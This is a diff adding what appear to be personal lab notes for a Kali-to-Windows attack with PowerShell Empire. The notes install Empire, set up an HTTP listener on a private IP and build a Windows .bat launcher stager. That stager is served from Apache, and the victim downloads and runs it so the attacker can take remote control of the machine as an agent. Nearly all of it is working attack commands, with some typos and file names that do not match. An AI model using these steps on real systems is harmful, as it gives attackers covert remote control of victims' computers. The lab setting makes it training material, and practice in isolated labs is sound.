@@ -1,0 +1,42 @@
+﻿mkdir /var/www/html/empire_backdoor/
+mkdir empire_lab
+cd empire_lab
+git clone https://github.com/EmpireProject/Empire.git
+cd Empire/setup
+./install.sh
+cd ..exit
+./empire
+
+//create a listener
+listeners
+(optional) uselistener back<tab><tab>
+uselistener http
+(optional) info
+set Port 8081
+set Host http:://10.0.2.10:8081
+execute
+back
+list  //list listener
+
+
+//create a backdoor for Windows, we need to know how to communicate with Windows Powershell securly (stager)
+back  //back to top level
+//(optional): usestager
+usestager windows/launcher_bat
+set Listener http
+set OutFile /var/www/html/empire_backdoor/emipire_http_8081.bat
+execute
+
+
+Victim download the backdoor payload from the website (Window machine)
+service apache2 start (Kali start the website)
+(Window 10: open IE)
+10.0.2.7/empire_backdoor
+(click the rev_https_8080.exe and run anyway)
+
+//Access to victim's computer
+agents
+interact <name of the victim's computer>
+sysinfo
+
+
